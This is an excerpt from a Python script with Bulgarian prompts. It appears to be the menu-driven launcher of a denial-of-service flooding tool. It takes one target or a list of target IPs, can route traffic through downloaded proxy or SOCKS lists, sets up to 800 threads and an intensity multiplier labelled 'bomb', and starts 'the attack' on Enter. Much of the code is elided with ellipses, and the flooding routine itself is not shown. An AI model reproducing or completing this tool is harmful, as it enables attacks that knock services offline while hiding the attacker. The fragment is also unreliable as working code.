...
def starturl(): 
	...
	choice1 = input("\nako искаш да удариш една цел [0] или повече[1] > ")

	if choice1 == "1":
		ip_file = input("Въведи лист с IP-та > ")
		...
		try:
			...
			print("Написано е грешно, опитайте пак.")
			starturl()
...
def proxymode():
	global choice2
	choice2 = input("Искате ли proxy/socks mode? Въведете 'y', за да ги включите: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Въведете '0' да включите proxymode или въведете '1' за socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Искате ли да изтеглите нов лист с Проксита? Въведете 'y' за да се изтеглят: ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("Искате ли да изтеглите нов лист с socks? Въведете 'y' за да се изтеглят: ")
	if choice4 == "y":
...
def proxyget(urlproxy): 
	try:
		...
		out_file.close()
		print ("Прокситата са успешно изтеглени.")
	except: 
		print ("\nERROR!\n")
	proxylist() 
...
def proxylist():
	global proxies
	out_file = str(input("въведете proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Колко threads искате? Препоръчително е 760,750 до макс 800 : "))
	except ValueError:
		threads = 800
		print ("800 threads избрани.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Избирайте: [(1-5=нормално)(50=мощно)(100 или повече=бомба)]: "))
	except ValueError:
		print("Имаш грешка, опитай пак.\n")
		multiplication()
	begin()

def begin():
	choice6 = input("Imma chargin mah lazzer (натисни 'enter' да пуснете атаката): ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": 
		loop()
